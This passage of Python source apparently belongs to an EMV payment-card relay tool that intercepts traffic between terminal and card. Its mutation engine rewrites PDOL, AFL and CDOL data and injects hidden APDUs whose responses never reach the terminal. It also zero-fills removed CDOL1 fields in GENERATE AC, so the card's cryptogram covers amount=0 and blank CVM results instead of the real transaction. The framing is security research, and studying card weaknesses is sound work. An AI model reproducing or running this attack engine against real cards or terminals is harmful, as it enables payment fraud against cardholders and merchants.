            spec_map.setdefault(spec.target_tag, []).append(spec)

    def _walk(node_list: list) -> list:
        nonlocal changed
        result = []
        for node in node_list:
            tag_specs = spec_map.get(node.tag, [])
            if tag_specs:
                raw_dol = bytes(node.value) if not isinstance(node.value, (bytes, bytearray)) else node.value
                dol_entries = _parse_dol(raw_dol)
                original_entries = [dict(e) for e in dol_entries]  # snapshot before any mutation

                for spec in tag_specs:
                    original_bytes = _serialize_dol(dol_entries)
                    if spec.mode == "remove_field":
                        dol_entries = [e for e in dol_entries if e["tag"] != spec.field_tag]
                        desc = f"removed field {spec.field_tag} from {node.tag}"
                    elif spec.mode == "truncate":
                        n = max(0, spec.truncate_to)
                        dol_entries = dol_entries[:n]
                        desc = f"truncated {node.tag} to {n} fields"
                    else:
                        desc = "no-op"

                    new_bytes = _serialize_dol(dol_entries)
                    all_records.append(MutationRecord(
                        ts_ms=int(time.time() * 1000),
                        session_id=session_id,
                        direction="response",
                        mutation_type="dol",
                        tag=node.tag,
                        mode=spec.mode,
                        original_hex=original_bytes.hex().upper(),
                        mutated_hex=new_bytes.hex().upper(),
                        ins=ins,
                        comment=spec.comment or desc,
                    ))
                    changed = True

                # Record original vs final entries for GENERATE AC reconstruction
                dol_state[node.tag] = (original_entries, [dict(e) for e in dol_entries])

                import copy as _copy
                new_node = _copy.copy(node)
                new_node.value = _serialize_dol(dol_entries)
                new_node.children = []
                result.append(new_node)
            elif node.children:
                import copy as _copy
                new_node = _copy.copy(node)
                new_node.children = _walk(node.children)
                result.append(new_node)
            else:
                result.append(node)
        return result

    new_nodes = _walk(nodes)
    if not changed:
        return response, [], {}

    new_body = serialize_tlv(new_nodes)
    return new_body + sw, all_records, dol_state


# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 6 – Injection engine
# ─────────────────────────────────────────────────────────────────────────────

class InjectionQueue:
    """
    Manages pending injected commands for a single transaction session.
    Thread-safe for the case where multiple threads fire responses concurrently.
    """

    def __init__(self, specs: list) -> None:
        # Deep-copy so _fired flags are per-session
        self._specs: list[InjectedCommand] = [copy.deepcopy(s) for s in specs]

    def reset(self) -> None:
        for spec in self._specs:
            spec.reset()

    def pending(self, ins: str, when: str) -> list:
        """Return specs that should fire for (INS, when) pair."""
        out = []
        for spec in self._specs:
            if not spec.enabled:
                continue
            if spec.trigger_ins.upper() != ins.upper():
                continue
            if spec.when != when:
                continue
            if spec._fired and not spec.repeat:
                continue
            out.append(spec)
        return out

    def mark_fired(self, spec: InjectedCommand) -> None:
        spec._fired = True


def run_injections(
    queue: "InjectionQueue",
    os_execute,          # callable: bytes -> bytes  (the card OS execute fn)
    ins: str,
    when: str,
    session_id: str = "",
) -> list:
    """
    Fire all pending injections for (ins, when).
    Returns list[MutationRecord] describing each injected command and its response.
    The responses are logged but never forwarded to the terminal.
    """
    specs = queue.pending(ins, when)
    records: list[MutationRecord] = []

    for spec in specs:
        apdu_bytes = bytes.fromhex(spec.apdu)
        log.debug(
            "Injecting APDU %s (%s, trigger=%s/%s)",
            spec.apdu, spec.comment, ins, when,
        )
        try:
            resp = os_execute(apdu_bytes)
            resp_bytes = _to_bytes(resp)
            resp_hex = resp_bytes.hex().upper()
        except Exception as exc:
            log.warning("Injection failed for APDU %s: %s", spec.apdu, exc)
            resp_hex = "ERROR"

        records.append(MutationRecord(
            ts_ms=int(time.time() * 1000),
            session_id=session_id,
            direction="command",
            mutation_type="injection",
            tag="",
            mode="inject",
            original_hex="",
            mutated_hex=resp_hex,
            ins=ins,
            comment=spec.comment or spec.apdu,
        ))

        queue.mark_fired(spec)

    return records


# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 7 – MutationEngine main class
# ─────────────────────────────────────────────────────────────────────────────

# ── Live sink ─────────────────────────────────────────────────────────────────
#
# Mutation records for the exchange currently in flight, so the dashboard can
# show what a rule changed next to the APDU it changed. The relay is one thread
# doing one exchange at a time, so a plain list drained per exchange is exact
# rather than approximately right.
#
# Deliberately separate from the JSONL log: a researcher should not have to
# turn on file logging to see in the UI why a response looks different from
# what the card sent.

_live_records: list = []


def publish_live(records: list) -> None:
    _live_records.extend(records)


def drain_live_records() -> list:
    """Take the records produced since the last call."""
    out = list(_live_records)
    _live_records.clear()
    return out


class MutationLog:
    """Append-only JSONL log for mutation events."""

    def __init__(self, path: str | None) -> None:
        self._path = path
        self._fh = None
        if path:
            Path(path).parent.mkdir(parents=True, exist_ok=True)
            try:
                self._fh = open(path, "a", buffering=1, encoding="utf-8")
            except OSError as e:
                log.warning("MutationLog: cannot open %s: %s", path, e)

    def write(self, records: list) -> None:
        if not records:
            return
        # Published before the file check on purpose — the dashboard shows
        # these whether or not a log path was configured.
        publish_live(records)
        if not self._fh:
            return
        for rec in records:
            try:
                self._fh.write(rec.to_json() + "\n")
            except Exception as e:
                log.warning("MutationLog write error: %s", e)

    def close(self) -> None:
        if self._fh:
            try:
                self._fh.flush()
                self._fh.close()
            except Exception:
                pass
            self._fh = None


class MutationEngine:
    """
    Layer 3: Controlled Mutations.

    Wraps InterceptAttack.user_execute() via on_command / on_response hooks.
    Instantiate with MutationEngine.from_config(path, os=<card_os>).
    """

    def __init__(self, config: dict, os_execute) -> None:
        """
        Parameters
        ----------
        config      : merged config dict (user YAML + defaults)
        os_execute  : callable(bytes) -> bytes — the card OS execute function
                      used exclusively for command injection; pass None to
                      disable injection.
        """
        self._enabled: bool = config.get("enabled", True)
        self._config_path: str | None = None  # set by from_config; enables hot-reload
        self._os_execute = os_execute

        # Build mutation spec lists
        self._pdol_mutations: list[PDOLFieldMutation] = [
            PDOLFieldMutation.from_dict(d)
            for d in config.get("pdol_mutations", [])
        ]
        self._response_mutations: list[ResponseTagMutation] = [
            ResponseTagMutation.from_dict(d)
            for d in config.get("response_mutations", [])
        ]
        self._afl_mutations: list[AFLMutation] = [
            AFLMutation.from_dict(d)
            for d in config.get("afl_mutations", [])
        ]
        self._dol_mutations: list[DOLMutation] = [
            DOLMutation.from_dict(d)
            for d in config.get("dol_mutations", [])
        ]
        inject_specs: list[InjectedCommand] = [
            InjectedCommand.from_dict(d)
            for d in config.get("injected_commands", [])
        ]

        # Session state and injection queue
        self._session = SessionState()
        self._inj_queue = InjectionQueue(inject_specs)

        # Mutation log
        log_path: str | None = config.get("log_path") if config.get("log_mutations", True) else None
        self._mut_log = MutationLog(log_path)

        log.info(
            "MutationEngine ready: %d PDOL, %d response, %d AFL, %d DOL, %d injection specs",
            len(self._pdol_mutations),
            len(self._response_mutations),
            len(self._afl_mutations),
            len(self._dol_mutations),
            len(inject_specs),
        )

    # ── Factory ────────────────────────────────────────────────────────────

    @classmethod
    def from_config(cls, config_path: str, os=None) -> "MutationEngine":
        """
        Load mutations.yaml (or .toml / .json) and return a MutationEngine.

        Parameters
        ----------
        config_path : path to the config file
        os          : card OS object with an .execute(apdu) method, or None
        """
        config = _load_config(config_path)
        os_fn = (lambda apdu: os.execute(apdu)) if os is not None else None
        instance = cls(config, os_fn)
        instance._config_path = config_path
        return instance

    # ── Hot-reload support ─────────────────────────────────────────────────

    def _reload_specs(self, config: dict) -> None:
        """Rebuild all mutation spec lists from config. Session state is untouched."""
        self._enabled = config.get("enabled", True)
        self._pdol_mutations = [
            PDOLFieldMutation.from_dict(d) for d in config.get("pdol_mutations", [])
        ]
        self._response_mutations = [
            ResponseTagMutation.from_dict(d) for d in config.get("response_mutations", [])
        ]
        self._afl_mutations = [
            AFLMutation.from_dict(d) for d in config.get("afl_mutations", [])
        ]
        self._dol_mutations = [
            DOLMutation.from_dict(d) for d in config.get("dol_mutations", [])
        ]
        inject_specs = [
            InjectedCommand.from_dict(d) for d in config.get("injected_commands", [])
        ]
        self._inj_queue = InjectionQueue(inject_specs)
        log_path = config.get("log_path") if config.get("log_mutations", True) else None
        self._mut_log.close()
        self._mut_log = MutationLog(log_path)

    def reload(self) -> None:
        """Hot-reload mutations.yaml from disk. Called at the start of each new transaction."""
        if not self._config_path:
            return
        try:
            config = _load_config(self._config_path)
            self._reload_specs(config)
            log.info(
                "MutationEngine: reloaded — %d PDOL, %d response, %d AFL, %d DOL, %d injection specs",
                len(self._pdol_mutations),
                len(self._response_mutations),
                len(self._afl_mutations),
                len(self._dol_mutations),
                len(self._inj_queue._specs),
            )
        except Exception as e:
            log.warning("MutationEngine: reload failed: %s", e)

    # ── Transaction hooks ──────────────────────────────────────────────────

    def on_command(self, msg) -> Any:
        """
        Called before the command reaches the card.
        Performs PDOL mutation (GPO) and before_command injections.
        Returns the (possibly modified) command.
        """
        if not self._enabled:
            return msg

        raw = _to_bytes(msg)
        if len(raw) < 2:
            return msg

        ins = f"{raw[1]:02X}"
        self._session.last_ins = ins
        self._session.last_cmd = raw

        # Detect new session on SELECT AID
        if ins == "A4" and len(raw) > 4 and raw[2] == 0x04:
            self.reload()  # pick up any mutations.yaml changes written since relay started
            self._session.reset()
            self._inj_queue.reset()
            log.debug("MutationEngine: new session %s", self._session.session_id)

        # Capture PDOL from SELECT FCI is done in on_response; no action here.

        # before_command injections — skip while card is holding data for GET RESPONSE
        # (SW1=61/9F already sent; card rejects every APDU until C0 arrives)
        if self._os_execute and not self._session.pre_get_response_ins:
            inj_records = run_injections(
                self._inj_queue,
                self._os_execute,
                ins,
                "before_command",
                self._session.session_id,
            )
            self._mut_log.write(inj_records)
            if inj_records:
                log.info(
                    "Injected %d command(s) before INS=%s", len(inj_records), ins
                )

        # GENERATE AC command data reconstruction.
        # When DOL remove_field strips fields from CDOL1, the terminal sends a
        # shorter GENERATE AC payload. Cards that validate Lc against their own
        # CDOL1 return 67 00 (Wrong Length). We pad the data back to the original
        # CDOL1 length by inserting zero bytes for the removed fields so the card
        # processes the command normally — but its cryptogram now covers zero-filled
        # values for those fields (amount=0, CVM results=0, etc.), decoupling the
        # AC from the real transaction context (PDOL/CDOL desynchronisation).
        if ins == "AE" and self._session.cdol1_original_entries:
            orig = self._session.cdol1_original_entries
            mutated = self._session.cdol1_mutated_entries
            orig_tags = [e["tag"] for e in orig]
            mut_tags  = [e["tag"] for e in mutated]
            if orig_tags != mut_tags:   # fields were actually removed
                new_raw = _reconstruct_genac_cmd(raw, orig, mutated)
                if new_raw != raw:
                    removed = [e for e in orig if e["tag"] not in set(mut_tags)]
                    log.info(
                        "GENERATE AC reconstructed: Lc %d → %d bytes "
                        "(zero-filled %d removed CDOL1 field(s): %s)",
                        raw[4] if len(raw) > 4 else 0,
                        new_raw[4] if len(new_raw) > 4 else 0,
                        len(removed),
                        ", ".join(e["tag"] for e in removed),
                    )
                    self._mut_log.write([MutationRecord(
                        ts_ms=int(time.time() * 1000),
                        session_id=self._session.session_id,
                        direction="command",
                        mutation_type="cdol_reconstruct",
                        tag="8C",
                        mode="reconstruct",
                        original_hex=(raw[5:5 + raw[4]].hex().upper() if len(raw) > 5 else ""),
                        mutated_hex=(new_raw[5:5 + new_raw[4]].hex().upper() if len(new_raw) > 5 else ""),
                        ins=ins,
                        comment=(
                            "GENERATE AC padded for card CDOL1 compatibility — "
                            "zero-filled: " + ", ".join(e["tag"] for e in removed)
                        ),
                    )])
                    if isinstance(msg, str):
                        return "".join(chr(b) for b in new_raw)
                    return new_raw

        # PDOL mutation on GPO
        if ins == "A8" and self._pdol_mutations:
            if not self._session.pdol_entries:
                has_enabled = any(m.enabled for m in self._pdol_mutations)
                (log.warning if has_enabled else log.debug)(
                    "GPO received but no PDOL entries captured; "
                    "PDOL mutation skipped (card has no 9F38 PDOL in FCI)"
                )
            else:
                new_raw, records = apply_pdol_mutations(
                    raw,
                    self._session.pdol_entries,
                    self._pdol_mutations,
                    self._session.session_id,
                )
                self._mut_log.write(records)
                if records:
                    log.info(
                        "PDOL mutation applied %d field(s) on GPO", len(records)
                    )
                    # Preserve original wire type (relay_os returns str-like)
                    if isinstance(msg, str):
                        return "".join(chr(b) for b in new_raw)
                    return new_raw

        return msg

    def on_response(self, cmd, response) -> Any:
        """
        Called after the card response, before it reaches the terminal.
        Captures PDOL from SELECT FCI, applies response TLV mutations,
        and fires after_response injections.
        Returns the (possibly modified) response.
        """
        if not self._enabled:
            return response

        raw_cmd = _to_bytes(cmd)
        raw_resp = _to_bytes(response)
        ins = f"{raw_cmd[1]:02X}" if len(raw_cmd) >= 2 else ""
        sw1 = raw_resp[-2] if len(raw_resp) >= 2 else 0x00

        # T=0 GET RESPONSE chaining.
        # SW1=61 and SW1=9F both mean "more data pending; send GET RESPONSE".
        # The card rejects every APDU until C0 arrives, so return immediately
        # and stash the original INS/cmd so mutations fire correctly on the C0.
        if ins == "C0" and self._session.pre_get_response_ins:
            effective_ins = self._session.pre_get_response_ins
            effective_cmd = self._session.pre_get_response_cmd
            self._session.pre_get_response_ins = ""
            self._session.pre_get_response_cmd = b""
        else:
            effective_ins = ins
            effective_cmd = raw_cmd
            if sw1 in (0x61, 0x9F):
                self._session.pre_get_response_ins = ins
                self._session.pre_get_response_cmd = raw_cmd
                return response
            elif self._session.pre_get_response_ins:
                # Terminal skipped GET RESPONSE; discard stale context
                self._session.pre_get_response_ins = ""
                self._session.pre_get_response_cmd = b""

        # Only apply mutations and injections on completed successful responses
        # (90 00, 62/63 XX success-with-warning).  Skip error and protocol-retry
        # SW codes (6C XX wrong-length, 6A XX not-found, 69 XX not-allowed, etc.)
        # — the terminal handles these itself and injecting mid-retry confuses state.
        if sw1 not in (0x90, 0x62, 0x63):
            return response

        # Capture PDOL structure from SELECT response FCI
        if effective_ins == "A4" and len(effective_cmd) > 4 and effective_cmd[2] == 0x04:
            entries = _parse_fci_for_pdol(raw_resp)
            if entries:
                self._session.pdol_entries = entries
                log.debug(
                    "Captured PDOL: %s",
                    [(e.tag, e.length) for e in entries],
                )

        # Snapshot pre-mutation length for T=0 Le preservation (see below)
        orig_resp_len = len(raw_resp)

        # Response TLV mutations
        all_records: list[MutationRecord] = []
        if self._response_mutations:
            new_resp, records = apply_response_mutations(
                raw_resp,
                effective_ins,
                self._response_mutations,
                self._session.session_id,
            )
            all_records.extend(records)
            if records:
                log.info("Response mutation applied %d tag(s) on INS=%s", len(records), effective_ins)
            raw_resp = new_resp

        # AFL mutations (tag 94 in GPO response)
        if self._afl_mutations and effective_ins == "A8":
            new_resp, records = apply_afl_mutations(
                raw_resp, self._afl_mutations, self._session.session_id, effective_ins,
            )
            all_records.extend(records)
            if records:
                log.info("AFL mutation applied %d change(s) on GPO response", len(records))
            raw_resp = new_resp

        # DOL mutations (CDOL1/CDOL2 in READ RECORD responses)
        if self._dol_mutations and effective_ins in ("B2", "B0"):
            new_resp, records, dol_state = apply_dol_mutations(
                raw_resp, self._dol_mutations, self._session.session_id, effective_ins,
            )
            all_records.extend(records)
            if records:
                log.info("DOL mutation applied %d change(s) on INS=%s", len(records), effective_ins)
            raw_resp = new_resp
            # Store CDOL1 state so on_command can reconstruct GENERATE AC Lc
            if "8C" in dol_state:
                orig_entries, final_entries = dol_state["8C"]
                self._session.cdol1_original_entries = orig_entries
                self._session.cdol1_mutated_entries = final_entries

        # T=0 Le length preservation.
        # Any mutation that removes or shortens a tag shrinks the response below
        # the Le negotiated by the card's preceding `6C XX` → terminal restarts.
        # Restore the original length by padding 0xFF inside the outer template.
        if len(raw_resp) < orig_resp_len:
            raw_resp = _pad_tlv_response_to_length(raw_resp, orig_resp_len)

        # after_response injections
        if self._os_execute:
            inj_records = run_injections(
                self._inj_queue,
                self._os_execute,
                effective_ins,
                "after_response",
                self._session.session_id,
            )
            all_records.extend(inj_records)
            if inj_records:
                log.info(
                    "Injected %d command(s) after INS=%s", len(inj_records), effective_ins
                )

        self._mut_log.write(all_records)

        # Return same type as input for compatibility with relay_os str returns
        if isinstance(response, str):
            return "".join(chr(b) for b in raw_resp)
        return raw_resp

    def close(self) -> None:
        self._mut_log.close()

    def __del__(self) -> None:
        try:
            self.close()
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────────────────────
# Config loader (mirrors emv_logger approach)
# ─────────────────────────────────────────────────────────────────────────────

def _deep_merge(base: dict, override: dict) -> dict:
    """Merge `override` into `base`, recursing into nested dicts."""
    result = dict(base)
    for k, v in override.items():
        if k in result and isinstance(result[k], dict) and isinstance(v, dict):
            result[k] = _deep_merge(result[k], v)
        else:
            result[k] = v
    return result


def _load_config(path: str) -> dict:
    """Load YAML / TOML / JSON config and merge with _DEFAULT_CONFIG."""
    p = Path(path)
    if not p.exists():
        log.info("MutationEngine: config %s not found, using defaults", path)
        return dict(_DEFAULT_CONFIG)

    suffix = p.suffix.lower()
    raw: dict = {}
    try:
        if suffix in {".yaml", ".yml"}:
            import yaml  # type: ignore
            with open(p, encoding="utf-8") as fh:
                raw = yaml.safe_load(fh) or {}
        elif suffix == ".toml":
            try:
                import tomllib  # Python 3.11+
            except ImportError:
                import tomli as tomllib  # type: ignore
            with open(p, "rb") as fh:
                raw = tomllib.load(fh)
        elif suffix == ".json":
            with open(p, encoding="utf-8") as fh:
                raw = json.load(fh)
        else:
            log.warning("MutationEngine: unrecognised config suffix %s", suffix)
    except Exception as e:
        log.warning("MutationEngine: failed to load config %s: %s", path, e)

    return _deep_merge(_DEFAULT_CONFIG, raw)


# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 8 – Standalone CLI test runner
# ─────────────────────────────────────────────────────────────────────────────

def _cli_stdin(engine: MutationEngine) -> None:
    """
    Read C/R hex lines from stdin and feed them through the mutation engine.

    Input format (same as emv_logger_cli):
        C <hex APDU>     — command (terminal → card direction)
        R <hex response> — response (card → terminal direction)
    """
    import sys
    last_cmd = b""
    print("mutation_engine stdin mode — enter 'C <hex>' or 'R <hex>', Ctrl-D to quit")
    for line in sys.stdin:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(None, 1)
        if len(parts) < 2:
            continue
        direction, hex_data = parts[0].upper(), parts[1].replace(" ", "")
        try:
            raw = bytes.fromhex(hex_data)
        except ValueError:
            print(f"  [!] Invalid hex: {hex_data!r}")
            continue

        if direction == "C":
            mutated = engine.on_command(raw)
            last_cmd = _to_bytes(mutated)
            mut_hex = last_cmd.hex().upper()
            original = hex_data.upper()
            if mut_hex != original:
                print(f"  CMD original : {original}")
                print(f"  CMD mutated  : {mut_hex}")
            else:
                print(f"  CMD          : {original}")
        elif direction == "R":
            mutated = engine.on_response(last_cmd, raw)
            mut_hex = _to_bytes(mutated).hex().upper()
            original = hex_data.upper()
            if mut_hex != original:
                print(f"  RESP original: {original}")
                print(f"  RESP mutated : {mut_hex}")
            else:
                print(f"  RESP         : {original}")
        else:
            print(f"  [!] Unknown direction {direction!r}; use C or R")


def _cli_main() -> None:
    import argparse

    parser = argparse.ArgumentParser(
        description="mutation_engine – standalone test runner"
    )
    parser.add_argument(
        "--mode",
        choices=["stdin"],
        default="stdin",
        help="Input mode (currently only 'stdin' is supported)",
    )
    parser.add_argument(
        "--config",
        default="mutations.yaml",
        help="Path to mutations YAML/TOML/JSON config (default: mutations.yaml)",
    )
    parser.add_argument(
        "--log-level",
        default="INFO",
        choices=["DEBUG", "INFO", "WARNING", "ERROR"],
        help="Python logging level",
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=getattr(logging, args.log_level),
        format="%(levelname)s %(name)s: %(message)s",
    )

    engine = MutationEngine.from_config(args.config, os=None)

    if args.mode == "stdin":
        _cli_stdin(engine)

    engine.close()


if __name__ == "__main__":
    _cli_main()
